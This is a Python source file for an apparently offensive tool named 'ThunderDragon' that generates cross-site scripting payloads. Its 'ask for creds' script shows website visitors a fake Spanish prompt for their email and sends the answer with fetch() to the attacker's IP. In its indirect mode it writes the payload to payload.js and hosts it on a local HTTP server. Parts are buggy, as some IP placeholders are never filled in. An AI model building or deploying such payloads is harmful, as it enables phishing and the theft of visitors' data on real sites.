# Made by: Airil / Ainhoa

from subprocess import call, check_output
import subprocess
import requests
import os
import signal
import sys

from other_functions import guardar_en_portapapeles

from termcolor import colored

DN = open(os.devnull, 'w')

http_server_process = None
def stop_http_server(signal, frame): #### testear esto, es CTRL+C para parara el servidor tercero donde se almacena el payload (estoy dormidita hasi que para mañana)
    global http_server_process
    if http_server_process is not None:
        http_server_process.terminate()
    sys.exit(0)

def xss_scripts():
    ip_question = input(str(colored("\nThunderDragon", 'blue') + colored(" Local IP or Public IP [local/public] > ", 'red'))).strip().lower()
    if ip_question == "local":
        my_ip = check_output(['hostname', '-I']).strip().decode('utf-8')
    else:
        my_ip = requests.get('https://api.ipify.org').text
    
    print("my ip:", my_ip)
    
    attack_type = input(str(colored("\nThunderDragon", 'blue') + colored(" ATTACK TYPE [direct/indirect] > ", 'red'))).strip().lower()
    
    used, used1 = True, False
    
    while used != True or used1 != True:
        used1 = True
        script = input(str(colored("\nThunderDragon", 'blue') + colored(" SCRIPT (help for scripts list) > ", 'red'))).strip().lower()
        
        if script == "ask for creds":
            if attack_type == "direct" or attack_type == "d":
                script = str('<script>'+
                            '\n    var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");'+
                            '\n    if (email == null || email == ""){'+
                            '\n        alert("Es necesario introduccir un correo válido para visualizar el post");'+
                            '\n    } else {'+
                            f'\n        fetch("http://{my_ip}/?email=" + email)'+
                            '\n    }'+
                            '\n</script>')
                guardar_en_portapapeles(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                payload = '''var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
                            if (email == null || email == ""){
                                alert("Es necesario introducir un correo válido para visualizar el post");
                            } else {
                                fetch("http://{my_ip}/?email=" + email)
                            }'''
                script = str('<script src="http://{mi ip}/payload.js"></script>')
                guardar_en_portapapeles(script)
                print(str(colored("[+] Script copyed on the ", 'green') + colored("clipboard", 'cyan')))
                
                with open('payload.js', 'w') as file:
                    file.write(payload)
                
                print(colored("[+] Payload created", 'green'))
                
                print(colored("[+] Starting payload hosting http server...", 'green'))
                print(colored("\n[-] CTRL+C TO STOP\n", 'yellow'))
                
                signal.signal(signal.SIGINT, stop_http_server)
                call(['python3', '-m', 'http.server', '80'])
                
                os.remove('payload.js')
                
                print(colored("[+] HTTP Server stoped and payload removed", 'green'))
            
        elif script == "help":
            print(str(colored(" SCRIPTS :", 'green', attrs=['dark', 'underline'])+
                      "\n · ask for creds"))
            used1 = False
            
        else:
            used1 = False
    
    if attack_type == "direct":
        listening_question = input(str(colored("\nThunderDragon", 'blue') + colored(" START LISTENING [y/n] > ", 'red'))).strip().lower()
        
        if listening_question == "y" or listening_question == "yes":
            pass
        else:
            pass
